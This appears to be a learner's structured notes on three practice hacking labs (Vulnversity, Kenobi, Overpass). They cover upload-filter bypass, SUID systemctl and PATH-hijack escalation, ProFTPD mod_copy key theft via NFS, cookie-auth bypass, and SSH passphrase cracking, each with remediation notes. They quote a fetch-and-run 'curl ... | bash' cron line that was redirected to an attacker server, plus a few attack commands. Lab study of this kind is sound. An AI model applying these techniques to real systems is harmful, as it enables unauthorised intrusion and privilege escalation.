labs.title: Vulnversity
labs.summary: I chained an executable file-upload flaw with a root-owned SUID systemctl misconfiguration to achieve root command execution.

attackPath.title: Find upload functionality
attackPath.detail: I enumerated the web application and found an upload form at `/internal/`.

attackPath.title: Check extension validation
attackPath.detail: I fuzzed filename extensions using Burp Intruder. The first `.phtml` request failed because Burp encoded the dot as `%2e`; after fixing the raw filename, `.phtml` was accepted.

attackPath.title: Trigger a reverse shell
attackPath.detail: I configured PHP to connect to my `tun0` address on port 1234, started Netcat and triggered the uploaded file. The returned shell identified as `www-data`.

attackPath.title: Enumerate local privileges
attackPath.detail: I found root-owned SUID `/bin/systemctl` and checked its permission string rather than assuming any SUID program was vulnerable.

attackPath.title: Verify privileged execution
attackPath.detail: I registered a temporary oneshot service that wrote the output of `id` to `/tmp`; its output confirmed `uid=0(root)`.

attackPath.title: Inspect restricted files
attackPath.detail: I reused privileged service execution to inspect `/root` and see `root.txt`. I also practiced a privileged-shell technique with guidance; the final shell identity was not posted.

labs.methodology:
## My approach
I started by enumerating exposed services and the web application. When I reached a file-upload form, I treated it as a possible execution boundary and checked how the server validated extensions. I used Burp to compare what the browser intended to send with what actually went over the wire.

Once the upload executed PHP and my callback connected, I had a `www-data` shell. I then switched from remote enumeration to local privilege checks. The unusual SUID permissions on `systemctl` were more interesting than normal installed SUID programs, so I verified its impact with a one-command `id` service before considering an interactive privileged shell.

recon.title: HTTP upload filter
recon.detail: I received `Extension not allowed` in the response body even when HTTP returned 200. The raw Intruder request contained `filename="shell%2ephtml"`, so I corrected it to use a literal dot.

recon.title: Kali VPN and reverse connection
recon.detail: My Kali VPN interface was `tun0`. I configured the PHP callback to its address and listened on port 1234. The resulting shell identified itself as `www-data`.

recon.title: Root-owned SUID systemctl
recon.detail: I checked `/bin/systemctl` and confirmed `-rwsr-xr-x` with `root` ownership.

recon.title: Root execution confirmation
recon.detail: I used a temporary systemd service to run `id` and redirect output to `/tmp`. The output was `uid=0(root)`; my original reverse shell still belonged to `www-data`.

recon.title: Protected directory
recon.detail: I inspected `/root` through the privileged service and saw `root.txt` (33 bytes). I am not storing the flag value.

findings.title: Executable upload accepted by web application
findings.evidence: I observed a `.phtml` upload succeeded after correcting the transmitted multipart filename, and executing the uploaded PHP produced a `www-data` shell.
findings.rootCause: I traced this to executable file upload was permitted in a web-accessible location and processed as server-side PHP.
findings.impact: I demonstrated remote code execution with web-service privileges.
findings.remediation: I would use strict allowlists and verify file content server-side; store uploads outside executable directories; disable script execution for upload paths.
findings.validation: I would check disallowed scripts cannot be uploaded or executed.

findings.title: Root-owned systemctl with SUID bit
findings.evidence: I observed `ls -l /bin/systemctl` showed `-rwsr-xr-x ... root root`. A temporary service executed `id` and wrote `uid=0(root)` to a file.
findings.rootCause: I traced this to sUID on a service-management utility allowed privileged service operations to be requested by a lower-privileged user in this lab.
findings.impact: I demonstrated privilege escalation from web-service access to root-level command execution.
findings.remediation: I would remove the SUID bit from systemctl and audit authorization policy and privileged services.
findings.validation: I would with an unprivileged account, verify custom root service creation and execution are denied.

learnings: I can explain SYN scanning and why `open`, `closed` and `filtered` are different observations, not vulnerability verdicts.
I inspect the raw HTTP request and response text instead of trusting HTTP status 200 as upload success.
I understand how Burp Intruder modifies filename extensions and how URL encoding can change the actual submitted value.
I know why the PHP reverse shell calls back to my VPN interface and why Netcat listens on the matching port.
I can recognize root-owned SUID permissions and explain that `systemctl` manages services through systemd.
I understand that a `.service` file defines a command and that redirecting its output can establish the executing identity.
I understand that root-level command execution by a service does not automatically elevate my original reverse shell.
I understand that parent-directory traversal permissions also control whether a file can be opened.
difficulties: I needed explanations to understand the SYN/ACK/RST port-state evidence.
I initially missed Burp’s encoding of the extension dot (`%2e`).
I followed guidance for writing systemd unit files and turning root command execution into shell access.
The final interactive root-shell identity and flag contents are not present in my recorded output.
labs.report:
## Result
I obtained a `www-data` reverse shell through the upload form and verified root command execution through a custom oneshot service. The proof file contained `uid=0(root)`. I later completed the room, but I have not retained a posted final root-shell `id` or flag value here.

## What made the attack possible
The upload directory accepted and executed server-side PHP. Separately, a root-owned `systemctl` was SUID and accepted privileged service-management operations. My access to the website alone was not enough; I needed the second weakness to cross from the web account to root.

## What I would change next time
I want to recognize candidate attack points and construct the service/shell commands without needing them dictated to me. I should record failed requests and why they failed, because they explain the exploit as clearly as the successful commands do.

decisions.signal: The web application contained a file-upload form.
decisions.question: Can a file uploaded through HTTP become executable code?
decisions.decision: I tested filename extensions instead of immediately attacking SSH or another service.
decisions.reason: An executable upload in a web-accessible location could give direct code execution with the web server identity.
decisions.result: `.phtml` ultimately uploaded and executed as PHP.

decisions.signal: Intruder returned HTTP 200 but the response said "Extension not allowed".
decisions.question: Was the problem the extension or the request format?
decisions.decision: I inspected the raw multipart request and noticed `shell%2ephtml`.
decisions.reason: A server can return 200 for a rejected application-level operation, and `%2e` may be treated as literal filename text.
decisions.result: Using the literal filename `shell.phtml` corrected the upload test.

decisions.signal: The uploaded script needed to connect back to my Kali machine.
decisions.question: Which address can the target reach?
decisions.decision: I used the `tun0` IP, not my public IP or the target address.
decisions.reason: The lab target reaches my Kali system through the TryHackMe VPN.
decisions.result: A shell connected to my Netcat listener as `www-data`.

decisions.signal: The web shell was not privileged.
decisions.question: Which local executables cross user privilege boundaries?
decisions.decision: I inspected SUID binaries and focused on the unusual SUID-root `systemctl`.
decisions.reason: SUID can give a root-owned executable an effective root identity; service management is a powerful capability.
decisions.result: A custom service executed `id` as root.

decisions.signal: I could run a root command, but my Netcat shell was still `www-data`.
decisions.question: How do I distinguish arbitrary root execution from an interactive root shell?
decisions.decision: I first wrote command output to `/tmp`, then explored interactive-shell options.
decisions.reason: A process launched by systemd and my existing shell are separate processes with different credentials.
decisions.result: Root command execution was confirmed; the separate interactive shell was practiced without a posted final `id`.

labs.title: Kenobi
labs.status: Initial access complete; local escalation practiced with guidance
labs.summary: I linked anonymous SMB information disclosure, a ProFTPD file-copy weakness and an NFS export to obtain SSH access as kenobi, then investigated a SUID PATH hijack.

attackPath.title: Enumerate all reachable TCP ports
attackPath.detail: I found 11 open ports, including FTP, SSH, HTTP, SMB, RPC and NFS. I did not assume an open port was vulnerable.

attackPath.title: Read an anonymous SMB share
attackPath.detail: Nmap SMB scripts returned no details, so I tried `smbclient`. I read `log.txt`, which exposed SSH key paths and useful configuration clues.

attackPath.title: Identify ProFTPD and research its version
attackPath.detail: I identified ProFTPD 1.3.5 and used SearchSploit to find the `mod_copy` file-copy technique.

attackPath.title: Validate FTP commands
attackPath.detail: I checked `SITE HELP` and tested `SITE CPFR`/`SITE CPTO` against the lab server, rather than treating a matching exploit listing as proof.

attackPath.title: Find a way to retrieve the copied key
attackPath.detail: I found the `/var` NFS export and mounted it on Kali. A file copied by FTP into `/var/tmp` was readable through the NFS mount.

attackPath.title: Log in using SSH
attackPath.detail: I copied the key locally, set restrictive permissions, and authenticated as `kenobi`.

attackPath.title: Examine SUID menu
attackPath.detail: I found `/usr/bin/menu`, inspected its strings and practiced PATH hijacking with guidance; I did not supply a final `id` result from the privileged shell.

labs.methodology:
## My approach
I started with all TCP ports instead of choosing a target service blindly. I explored SMB because it allowed anonymous access; `log.txt` revealed an SSH key path and configuration clues. I had the path, not the key, so my next question was how I could access that file.

Nmap identified the FTP service and version. SearchSploit gave me candidate exploits, but I selected the file-copy behavior because it connected directly to the known key path. I verified `SITE` commands on the actual target instead of trusting the Exploit-DB example. When I discovered the NFS `/var` export, I could combine FTP's server-side file placement with NFS's remote file access.

Once SSH worked, I inspected SUID binaries. The unfamiliar `/usr/bin/menu` and its embedded `system()` command strings suggested a PATH lookup weakness. I learned the technique with guidance, but the final privileged identity was not captured in my report.

recon.detail: My full-port scan showed 11 open TCP ports. Four high-numbered ports appeared, but I did not positively identify those services.

recon.title: SMB shares and log.txt
recon.detail: Nmap SMB scripts returned no share list. I used a guest `smbclient` session instead and read `log.txt`, which contained `/home/kenobi/.ssh/id_rsa`. I treated the sample ProFTPD configuration as a clue, not proof of the active configuration.

commands.label: Retrieve share file from SMB prompt

recon.title: FTP service version and research
recon.detail: Nmap reported ProFTPD 1.3.5. SearchSploit showed `37262.rb`, `36803.py`, `49908.py` and the file-copy reference `36742.txt`.

recon.title: FTP SITE functionality
recon.detail: I checked `SITE HELP` and saw `CPFR` and `CPTO`. I tested a readable source with `SITE CPFR /etc/passwd`, then confirmed a separate SSH-key copy succeeded.

recon.title: NFS export and key retrieval
recon.detail: I discovered the `/var` NFS export, mounted it, retrieved the FTP-copied key under `/var/tmp`, and successfully authenticated as `kenobi` over SSH.

recon.title: SUID menu and PATH
recon.detail: `strings` exposed `setuid`, `system`, `curl -I localhost`, `uname -r` and `ifconfig`. I confirmed the normal `curl` location was `/usr/bin/curl` and learned PATH replacement with guidance; I did not record my final privileged `id`.

findings.title: Anonymous SMB disclosure
findings.evidence: I observed anonymous SMB access revealed `log.txt` containing SSH key locations and service configurations.
findings.rootCause: I traced this to the `[anonymous]` Samba share allowed guest access to operational information.
findings.impact: I demonstrated information disclosure helped construct an attack path into the machine.
findings.remediation: I would restrict guest shares and remove sensitive administrative files from anonymously accessible locations.
findings.validation: I would check anonymous users cannot read internal configuration or credential-location information.

findings.title: Unauthenticated ProFTPD mod_copy file copying
findings.evidence: I observed: proFTPD 1.3.5 exposed `SITE CPFR` and `SITE CPTO`; a server-side copy of an SSH private key into `/var/tmp` was reported successful.
findings.rootCause: I traced this to affected `mod_copy` behavior permitted file copying on the server without FTP authentication in the lab.
findings.impact: I demonstrated sensitive private-key material became available through another exported path.
findings.remediation: I would update or patch ProFTPD, disable unneeded mod_copy, and restrict filesystem privileges.
findings.validation: I would check unauthenticated SITE copy operations no longer succeed.

findings.title: NFS export enabled retrieval of copied key
findings.evidence: I observed `showmount -e` returned `/var`; mounting it enabled access to the copied file in `/var/tmp`. SSH access as kenobi was then confirmed.
findings.rootCause: I traced this to network-accessible export combined with an unsafe server-side file-copy operation.
findings.impact: I demonstrated an SSH login as `kenobi` with the retrieved key.
findings.remediation: I would limit NFS exports to necessary directories and authorized clients; protect sensitive copied material and key files.
findings.validation: I would check the export is restricted and sensitive files are not retrievable.

learnings: I learned to change enumeration methods when an Nmap script shows no results: a guest SMB session may still work.
I know that an SSH key path is not the private key itself.
I can search a service version in SearchSploit, read an exploit reference and check whether its prerequisites apply.
I understand that `SITE CPFR` and `SITE CPTO` copy files on the FTP server, not directly onto Kali.
I know why the NFS export of `/var` made a server-side file copy retrievable.
I used a retrieved SSH private key with restrictive permissions to log in as `kenobi`.
I learned how `strings` provides leads about a compiled binary and why unqualified commands plus `PATH` can be dangerous in SUID programs.
I can construct `export PATH=/home/kenobi/tools/:$PATH` and explain why the old PATH is preserved.
difficulties: Initially, I did not know how to decide which exposed software was an attack point without being told.
I needed guidance linking a disclosed private-key path, FTP copy capability and an NFS export.
Writing replacement scripts and the command sequence for a PATH hijack still requires practice.
No final privileged-shell `id` output from Kenobi was shared.
labs.report:
## Result
I obtained a working SSH login as `kenobi`. The path involved three distinct services: SMB gave me information, ProFTPD let me move a server-side file, and NFS gave me a route to retrieve it. After login I investigated `/usr/bin/menu` as a SUID PATH hijack candidate.

## Why this chain mattered
I did not need a separate remote code-execution exploit against every service. A weakness in one service became useful because another service exposed a compatible filesystem location. The key thinking step was asking what each discovery enabled, and what was still missing.

## What I would change next time
I want to choose candidate services myself, validate exploit prerequisites before running scripts, and build shell commands without a walkthrough. I would keep a short decision log while enumerating rather than only recording the final success.

## Evidence limit
My SSH login succeeded. The later SUID analysis was guided and the final root-shell identity was not included in the posted output.

decisions.signal: The host exposed both SMB ports, but Nmap’s SMB scripts returned no share listing.
decisions.question: Did that mean no SMB shares existed?
decisions.decision: I switched to `smbclient` and tested guest access.
decisions.reason: Silence from one enumeration method does not establish that the service has no accessible resources.

decisions.question: Is knowing a secret file path enough to gain access?
decisions.decision: I treated the key path as a target and looked for another service able to reach the filesystem.
decisions.reason: The path is only a clue; I needed file read or copy capability before I could authenticate.
decisions.result: FTP became worth investigating because it was also exposed.

decisions.question: Which public exploit matched both the software and my goal?
decisions.decision: I looked up the version in SearchSploit and inspected the `mod_copy` file-copy reference.
decisions.reason: I already had a sensitive file path. A file-copy capability could be more useful than trying arbitrary RCE scripts.
decisions.result: I found `SITE CPFR` and `SITE CPTO` and verified them against the lab.

decisions.signal: ProFTPD copied files on the server, but that did not download them to Kali.
decisions.question: How could I access the destination?
decisions.decision: I enumerated NFS exports and found `/var`.
decisions.reason: FTP server-side copying and NFS file access could be chained: place the key under `/var/tmp`, then read it through the mount.
decisions.result: I retrieved the private key and authenticated through SSH.

decisions.signal: The SUID file list contained an unfamiliar `/usr/bin/menu`.
decisions.question: Why is this binary more interesting than ordinary SUID utilities?
decisions.decision: I ran `strings`, looked for command names and the `system`/`setuid` functions, then checked `PATH`.
decisions.reason: A privileged program that resolves unqualified command names can invoke a different executable if its search path is controlled.
decisions.result: I learned the attack path with guidance; independent final root confirmation is not present.

labs.title: Overpass
labs.status: SSH access confirmed; root cron redirection prepared; final root-shell result not recorded
labs.independence: Web authentication bypass and initial attack-point discovery mostly independent; cron-chain execution developed with guidance; root completion not independently verified
labs.summary: I independently found an admin route, investigated its login JavaScript, bypassed client-trusted cookie authentication and recovered an encrypted SSH key. I used John to recover its passphrase and logged in as james. On the host, I identified a root cron job that fetched and executed HTTP script content, alongside a world-writable /etc/hosts file. I set up and confirmed a Kali-hosted script was reachable but did not post a final root-shell verification.

attackPath.title: Identify exposed services
attackPath.detail: My full TCP scan of the lab target found only SSH on port 22 and HTTP on port 80. I chose HTTP for initial investigation.

attackPath.title: Explore the web application
attackPath.detail: I found download and about pages, downloaded the application and inspected it with strings. I noticed a name on the About page but did not confirm it as a login account. Gobuster found /admin.

attackPath.title: Inspect login logic and control the cookie
attackPath.detail: I read the login JavaScript and observed it set a cookie on success. I manually created a cookie with a random value and reloaded /admin; the protected page became accessible. This points to authentication enforced by client-controlled state.

attackPath.title: Find an encrypted SSH key
attackPath.detail: The accessible admin content revealed the username james and an SSH private key. The locally saved key was initially rejected because permissions were 0664; chmod 600 fixed the permission warning, but SSH then requested a key passphrase.

attackPath.title: Recover the passphrase and authenticate
attackPath.detail: I converted the encrypted key to John's format with ssh2john.py and used John with rockyou.txt. John returned a passphrase match. I initially attempted SSH with uppercase James; after switching to lowercase james and using the passphrase, I confirmed an SSH login.

attackPath.title: Investigate cron as a privilege boundary
attackPath.detail: I proposed checking SUID, capabilities and scheduled tasks and chose cron. /etc/crontab contained a minutely root job: curl overpass.thm/downloads/src/buildscript.sh | bash.

attackPath.title: Find controllable hostname resolution
attackPath.detail: getent hosts overpass.thm returned 127.0.0.1. I found /etc/hosts owned by root but world writable (-rw-rw-rw-, mode 666), allowing james to change where the hostname resolves.

attackPath.title: Prepare an HTTP source for cron
attackPath.detail: I set up a Python HTTP server on Kali with the requested /downloads/src/buildscript.sh path. I confirmed the Overpass host could fetch a harmless test script using curl, then reported updating the hosts mapping.

attackPath.title: Understand the root reverse-shell mechanism
attackPath.detail: I learned how a Bash TCP redirection could connect an interactive shell back to Netcat, and why its privilege would come from the root cron job rather than from the shell code itself. I have not posted callback output or an id command confirming root on Overpass.

labs.methodology:
## How I approached the machine
I scanned the full TCP range and found SSH and HTTP. I investigated HTTP first because it offered more observable behavior without credentials. I did not jump straight to password guessing: I inspected the site, downloaded the application, used `strings`, enumerated paths with Gobuster and inspected the login JavaScript. I then noticed the login state depended on a cookie I could set myself. Testing that hypothesis exposed the admin page and an SSH key.

When SSH rejected the key, I distinguished Linux file permissions from the encryption passphrase protecting the key itself. I fixed the permissions, used `ssh2john.py` and John to test candidate passphrases offline, and corrected the case of the SSH username before successfully connecting.

With access as `james`, I considered SUID, capabilities and cron. I chose to inspect `/etc/crontab`, where I noticed root was downloading and executing a script every minute. I reasoned that controlling the downloaded script would be a way to execute commands as root. I examined hostname resolution and found `/etc/hosts` was world writable. I used a Kali HTTP server to test reachability and prepared a reverse-shell delivery path with guidance.

My key learning was to ask *what input can I control in an operation running with higher privileges?* The combination of a controllable hostname mapping and a root `curl | bash` task mattered more than either fact by itself.

recon.title: Initial attack surface
recon.detail: Only 22/tcp SSH and 80/tcp HTTP appeared open in my full TCP scan.

recon.title: HTTP investigation
recon.detail: I inspected the About and Download pages, inspected the downloaded app using strings, discovered /admin via Gobuster, and looked at the login JavaScript. I manually set a cookie to a random value and confirmed admin-page access without normal login. I did not preserve the exact script or cookie name.

recon.title: SSH permissions and passphrase
recon.detail: I initially saved the key with permission mode 0664, which OpenSSH refused to use. chmod 600 fixed that warning, but the key was encrypted. The uppercase account spelling initially failed, then SSH login succeeded with lowercase james and the recovered key passphrase.

commands.label: Convert encrypted private key for offline audit
Audit passphrase candidates
commands.output: 1 password hash loaded; 1 match recovered (passphrase intentionally omitted)

recon.title: Root cron job
recon.detail: I investigated crontab after obtaining SSH access. The job was configured to run every minute under root and pipe remote HTTP response text into Bash.

recon.title: Hostname resolution and permissions
recon.detail: I observed overpass.thm resolved to loopback and that /etc/hosts was world writable despite being owned by root. I reported updating it to redirect the hostname toward Kali.

recon.title: Test attacker-hosted script
recon.detail: I prepared a matching file path on Kali and served it with Python's HTTP server. I confirmed a curl request from the Overpass SSH session could fetch the test script. I did not retain proof that the scheduled root job executed the payload.

mkdir -p ~/overpass-web/downloads/src
cat > ~/overpass-web/downloads/src/buildscript.sh <<'EOF'

recon.title: Reverse-shell concept discussed
recon.detail: The Bash reverse-shell line was provided during the guided lesson and I reviewed how stdin, stdout and stderr are redirected to a TCP socket. I have not shared a successful callback or root id.

commands.label: Illustrative Bash callback in lab script

findings.title: Client-controlled cookie bypassed admin authentication
findings.evidence: I observed the web login script set a cookie on successful login, manually set a cookie with an arbitrary value, reloaded /admin and gained access to protected content.
findings.rootCause: I inferred the application relied on client-controlled login state rather than verifying an authenticated session server-side.
findings.impact: I accessed an admin page and obtained sensitive account/key information without normal login.
findings.remediation: I would enforce authentication and authorization server-side for every privileged route, use unguessable server-side sessions, and secure cookies with appropriate attributes.
findings.validation: I would verify arbitrary, modified, expired or unsigned cookies never grant access.

findings.title: Encrypted SSH private key exposed with recoverable passphrase
findings.evidence: I found an SSH private key in admin content, protected the saved key file with chmod 600, successfully ran ssh2john and recovered a passphrase match using John with rockyou.txt. I later authenticated to SSH as james.
findings.rootCause: I traced this to the private key being exposed through an accessible web route and having a passphrase present in a common password list.
findings.impact: I used the retrieved key and recovered passphrase to gain remote shell access as james.
findings.remediation: I would remove private keys from web content, rotate affected credentials and SSH keys, and protect keys with strong unique passphrases.
findings.validation: I would test unauthorized access to administrative assets and verify compromised credentials no longer authenticate.

findings.title: World-writable hosts file combined with root remote-script cron job
findings.evidence: I observed a root crontab entry executing curl overpass.thm/downloads/src/buildscript.sh | bash every minute, confirmed hostname resolution to loopback, and saw /etc/hosts had mode 666. I changed the hostname mapping and verified the target could fetch content from my Kali HTTP server.
findings.rootCause: I traced the escalation opportunity to unprivileged control over hostname resolution combined with root executing unverified remote HTTP content.
findings.impact: I established a plausible path to root code execution, but I have not retained an actual root callback or id result to confirm exploitation.
findings.remediation: I would restrict /etc/hosts to root-only writes, avoid executing downloaded scripts through a root cron job, and use trusted scripts with explicit integrity and ownership controls.
findings.validation: I would check /etc/hosts is not writable by unprivileged users and that the scheduled task cannot be redirected to untrusted code.

learnings: I chose HTTP from an initial SSH/HTTP surface, used Gobuster and inspected application JavaScript instead of immediately attempting brute force.
I recognized that a cookie set by JavaScript is not sufficient authentication if server-side checks trust user-controlled values.
I learned that chmod 600 protects the key file's local permissions, but does not remove the encryption passphrase inside an SSH private key.
I used ssh2john.py to prepare encrypted SSH key data for offline passphrase auditing and John with a wordlist to recover a matching passphrase.
I learned to pay attention to case-sensitive Linux account names: James and james are different names.
I suggested SUID, capabilities and cron as candidate local attack surfaces without being told which one to inspect.
I recognized that a root cron task running curl | bash is dangerous if I can influence what curl retrieves.
I can interpret -rw-rw-rw- as permission mode 666, even though the file owner is root.
I learned that /etc/hosts can influence hostname resolution independently of public DNS.
I understand why a remote Bash reverse shell inherits the privileges of the process that launched it; the reverse shell syntax itself does not elevate privileges.
I learned that Bash supports /dev/tcp redirection and that 0, 1 and 2 refer to stdin, stdout and stderr.
difficulties: I initially didn't know that SSH private keys can be protected with an encryption passphrase and confused this with the remote login password.
I attempted SSH as uppercase James and needed to correct the account name to lowercase james.
I still want to develop the ability to write unfamiliar shell commands from principles rather than depend on copied one-liners.
I needed guided instruction to assemble the Kali HTTP delivery path and understand the Bash reverse-shell redirections.
I have not supplied a final root-shell identity or flag to confirm that the root cron job executed my payload.
I have not yet submitted an independently written full pentest report for this lab.
labs.report:
## Result and evidence limit
I independently investigated the web application and found a way to access its admin page by creating a client-side cookie with an arbitrary value. The admin content exposed an encrypted SSH private key. I recovered its passphrase through offline wordlist auditing and successfully logged in as `james`.

After the SSH foothold, I considered SUID, capabilities and cron as possible local escalation surfaces. The root crontab had a dangerous `curl ... | bash` task, and `/etc/hosts` was world writable. I prepared a Kali-hosted script at the matching URL path, verified the host could fetch it and modified the mapping. My guided work covered a reverse-shell payload and the reason it would execute as root under that cron job. **I have not shared a successful root callback or final `id` output**, so I am not recording root compromise as confirmed.

## Why I made these decisions
I chose HTTP before SSH because it presented accessible functions I could examine without credentials. Instead of password guessing on `/admin`, I read the application's login logic and questioned whether the server truly validated the cookie. After SSH access, I looked for operations executed under a more privileged identity. A root cron job that runs downloaded script content was more actionable once I learned I could control `/etc/hosts`.

## Security cause and impact
Two separate boundaries were weak: the web application's authorization depended on client-controlled state, exposing an SSH private key; and the host allowed an unprivileged user to control resolution of a hostname used by a root task that automatically executed remote code. The first weakness resulted in demonstrated SSH account access. The second provides an escalation path pending final proof.

## What I need to practice next
I want to find attack points with less guidance, choose verification steps before chasing an exploit and become fluent enough to build shell pipelines and redirections from memory of the mechanism rather than memorizing exact payloads.

decisions.result: A manually created cookie with a random value provided access to admin content.

decisions.signal: The admin page contained a user name and an SSH private key.
decisions.question: Can the key authenticate me directly?
decisions.decision: I saved it and tried SSH.
decisions.reason: SSH was already exposed and the key could provide a valid credential.
decisions.result: SSH rejected its 0664 local permissions before asking for a passphrase.

decisions.signal: After chmod 600, SSH requested an encryption passphrase.
decisions.question: Is the file encrypted, or does SSH want the remote login password?
decisions.decision: I learned to distinguish key encryption from account authentication and tested key passphrase candidates offline with ssh2john and John.
decisions.reason: Offline verification against the encrypted key does not require remote password guessing.
decisions.result: John recovered one passphrase match; I did not publish the secret.

decisions.signal: SSH still failed when I typed James with a capital J.
decisions.question: Could the account name be wrong even though the key was valid?

decisions.signal: I had a shell as james and needed a higher-privilege path.
decisions.question: Should I check SUID, capabilities or automated tasks?
decisions.reason: A root-controlled scheduled task may execute attacker-controllable files or commands.
decisions.result: I found a root task running curl overpass.thm/downloads/src/buildscript.sh | bash every minute.

decisions.signal: The cron task downloaded and executed a script under root.
decisions.question: Can I control the file returned by overpass.thm?
decisions.decision: I inspected hostname resolution, then /etc/hosts permissions.
decisions.reason: Changing hostname resolution could change the destination of curl without modifying the protected crontab.
decisions.result: overpass.thm resolved to 127.0.0.1 and /etc/hosts was world writable.

decisions.signal: I could alter /etc/hosts to redirect overpass.thm.
decisions.question: What would Kali need to serve at the expected path?
decisions.decision: I set up an HTTP server with a matching /downloads/src/buildscript.sh file and tested fetching it from the target.
decisions.reason: The pathname and reachability must match before the cron job could obtain my content.
decisions.result: A direct curl test from the target returned the script, and I reported modifying hosts.

decisions.signal: A root cron task could execute a shell payload from my web server.
decisions.question: Does reverse-shell code itself provide root?
decisions.decision: I studied bash -i, /dev/tcp, and file-descriptor redirects.
decisions.reason: The shell receives privileges from its parent process. The network redirection only connects input and output to my listener.
decisions.result: I understand the mechanism but haven't captured a successful root identity from the actual scheduled execution.

guides.title: HTTP / web applications
guides.summary: Web applications expose routes, forms and uploads over HTTP.
guides.content:
HTTP is the request/response protocol I used to reach the Vulnversity upload form. A returned `200 OK` does not necessarily mean the application accepted my action; I need to read the response body.

I examine routes, forms, request bodies and where uploaded files are stored or executed. In Vulnversity, the important surface was a file-upload form rather than the HTTP service version itself.

## Overpass: authentication and script delivery
I visited the About and Download pages, used Gobuster to find `/admin`, and inspected the login JavaScript. When I manually set a cookie with an arbitrary value and refreshed the page, protected content appeared. This was not about guessing a password; the trust boundary between a client-controlled cookie and server authorization was the attack point.

Later, I used a Python HTTP server to serve `/downloads/src/buildscript.sh`, which was the path referenced by the target's scheduled `curl` job. A direct test from the target could fetch the script. I did not retain proof the scheduled task ran it.

techniques.title: Upload extension testing
techniques.why: An upload form may accept server-executable types.
techniques.approach: I captured the multipart request with Burp Intruder, varied the extension, checked the raw filename and tested whether the uploaded `.phtml` executed.

techniques.title: Client-side cookie authentication test
techniques.why: A login form can look secure while a protected route trusts an arbitrary cookie.
techniques.approach: I inspected the JavaScript, created a cookie with a random value and reloaded `/admin`. The content was accessible. I did not retain the exact cookie name.

techniques.title: Serve script for a root cron HTTP fetch
techniques.why: A scheduled `curl` command may trust content hosted at a controllable destination.
techniques.approach: I served a script at the exact requested path using Python's HTTP server and verified the target could fetch it. The cron execution itself is not confirmed in my notes.

guides.title: SMB / Samba
guides.summary: Network file sharing; I use it to discover shares and inspect accessible files.
guides.content:
SMB is a network file-sharing protocol typically exposed over TCP `445` or through NetBIOS on `139`. It lets me access server shares, subject to authentication and share permissions.

In Kenobi, the share was readable without a password. It exposed `log.txt` with the SSH private-key path and service configuration clues. **SMB itself was not a code-execution exploit in this lab**; guest access exposed information I could use elsewhere.

techniques.title: Guest share enumeration
techniques.why: A guest-readable share may reveal internal configuration files or sensitive paths.
techniques.approach: I tried Nmap SMB NSE scripts first, then `smbclient` with no password. In the share I listed files and downloaded `log.txt`.

guides.title: FTP / ProFTPD
guides.summary: FTP transfers files; ProFTPD also supports SITE commands provided by modules.
guides.content:
FTP typically listens on TCP `21`. Its control channel accepts readable text commands. `SITE` is an extension mechanism for server-specific functions.

I found ProFTPD 1.3.5 on Kenobi. The `mod_copy` module's `CPFR`/`CPTO` operations copied files **on the target server**. I needed another service to retrieve the copied file. I'll add further FTP techniques to this same page when I encounter them.

techniques.title: mod_copy: SITE CPFR / SITE CPTO
techniques.why: This version had a documented unauthenticated file-copy weakness that matched a private-key path I already knew.
techniques.approach: I identified the version, read a SearchSploit entry, verified `SITE` behavior using Netcat, then copied the SSH key into the NFS-exported `/var/tmp`.

guides.title: NFS
guides.summary: Mount remote Linux directories and work with their files through the filesystem.
guides.content:
NFS exposes directories as network filesystems, commonly involving TCP `2049`; RPC services such as `rpcbind` may help clients discover exports.

In Kenobi, `showmount -e` revealed `/var`. I mounted it on Kali at `/mnt/kenobi`. A file placed by FTP at the server's `/var/tmp` became visible under my Kali mount at `/mnt/kenobi/tmp`. I still need to consider UNIX permissions and export configuration.

techniques.title: Export discovery and mounting
techniques.why: A visible exported directory can provide a route to read files that another service writes there.
techniques.approach: I enumerated exports with `showmount`, mounted `/var`, and used it to retrieve the file created by ProFTPD.

guides.title: SSH
guides.summary: Remote login through an authenticated encrypted connection, usually on port 22.
guides.content:
SSH allows me to log in and execute commands when an account is authorized. I used key-based authentication in Kenobi: after retrieving `id_rsa`, I set its local mode to `600` and selected it with `ssh -i`.

Knowing a private-key *path* is not enough; I must obtain a usable key, and its public counterpart must be authorized for the account.

## Overpass: encrypted private key
The web admin route exposed an SSH private key for `james`, but saving the text into a file did not remove its encryption. I first had to set local permissions to `600` and then learned the key itself required a passphrase. I converted the key to John's cracking format with `ssh2john.py`, found a matching passphrase with `rockyou.txt` and logged in as lowercase `james`.

The SSH key's passphrase and the remote account password are separate credentials. Recovering the former can make key-based login possible if the matching public key is authorized.

techniques.title: Private-key login
techniques.why: The leaked key location became usable only after I retrieved the actual key.
techniques.approach: I copied the key through the FTP/NFS chain, restricted its permissions and authenticated as `kenobi` using `ssh -i`.

techniques.title: Encrypted SSH key with recoverable passphrase
techniques.why: A leaked key can still be passphrase-encrypted; I need to test whether the passphrase is weak before attempting login.
techniques.approach: I fixed file mode `0664` to `0600`, used `ssh2john.py` and John for offline testing, then authenticated as `james`. I don't store the passphrase.

guides.title: systemd / systemctl
guides.summary: systemd starts system services; systemctl is the client that requests those operations.
guides.content:
On the Linux host, `systemd` manages units such as `.service` files. A unit's `ExecStart` describes the command the manager will launch. The process identity depends on the unit configuration and authorization.

In Vulnversity I used an unusual SUID-root `systemctl` to start a custom oneshot service. This is a **local service-management interface**, not a network service like FTP or SMB.

techniques.title: SUID systemctl service execution
techniques.why: A root-owned SUID utility accepted privileged service-management actions in the lab.
techniques.approach: I wrote a oneshot unit that recorded `id` output to `/tmp`, linked/started it, and confirmed it ran as root.

guides.title: Nmap
guides.summary: Port discovery, service detection and NSE script enumeration.
guides.content:
I use Nmap to map accessible TCP ports, identify service versions and test service-specific hypotheses. An open port is a lead, not evidence of a vulnerability.

My initial scan on Kenobi found 11 open TCP ports. The SMB NSE scripts gave no enumeration results, so I switched clients rather than deciding that the service exposed nothing.

Port state does not confirm exploitability.

guides.title: Burp Suite Intruder
guides.summary: Change parts of intercepted HTTP requests to test how a web form validates input.
guides.content:
I used Intruder on the Vulnversity file-upload request. I placed a payload marker around the extension and tried common PHP-related suffixes. The critical lesson was checking **Request → Raw** to see what I really sent.

Initially the filename became `shell%2ephtml`; the server rejected it despite HTTP `200`. After I stopped URL-encoding the dot, the literal `.phtml` filename was accepted.

examples.title: Correct multipart filename
examples.explanation: I verified the exact filename in the raw request.

pitfalls: The response body, not only its status code, determines upload success.
An encoded dot (`%2e`) may be treated as literal text in a multipart filename.

guides.title: smbclient
guides.summary: List, connect to and download files from SMB shares.
guides.content:
